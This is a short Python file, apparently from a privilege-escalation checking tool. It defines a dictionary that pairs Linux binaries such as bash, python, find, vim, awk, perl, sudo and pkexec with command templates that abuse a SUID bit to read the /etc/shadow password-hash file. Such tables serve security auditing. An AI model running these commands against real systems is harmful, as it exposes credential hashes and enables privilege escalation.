#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu May 21 22:37:54 2026

@author: hounsousamuel
"""

SUID_DANGEROUS = {
    # Shells
    "bash": "{binary} -c 'cat /etc/shadow 2>&1'",
    "sh": "{binary} -c 'cat /etc/shadow 2>&1'",
    "dash": "{binary} -c 'cat /etc/shadow 2>&1'",
    
    # Python
    "python": "{binary} -c 'import os; os.system(\"cat /etc/shadow\")'",
    "python3": "{binary} -c 'import os; os.system(\"cat /etc/shadow\")'",
    
    # Find
    "find": "{binary} / -exec cat /etc/shadow \\; 2>&1",
    
    # Editors
    "vim": "{binary} -c ':!cat /etc/shadow'",
    "vi": "{binary} -c ':!cat /etc/shadow'",
    
    # File operations
    "cp": "{binary} /etc/shadow /tmp/shadow_test 2>&1 && cat /tmp/shadow_test 2>&1",
    "cat": "{binary} /etc/shadow 2>&1",
    "less": "{binary} /etc/shadow 2>&1",
    "more": "{binary} /etc/shadow 2>&1",
    
    # Scripting
    "awk": "{binary} 'BEGIN {system(\"cat /etc/shadow\")}'",
    "perl": "{binary} -e 'system(\"cat /etc/shadow\")'",
    "php": "{binary} -r 'system(\"cat /etc/shadow\");'",
    "sudo": "{binary} -n cat /etc/shadow 2>/dev/null",
    "pkexec": "{binary} cat /etc/shadow 2>/dev/null",
}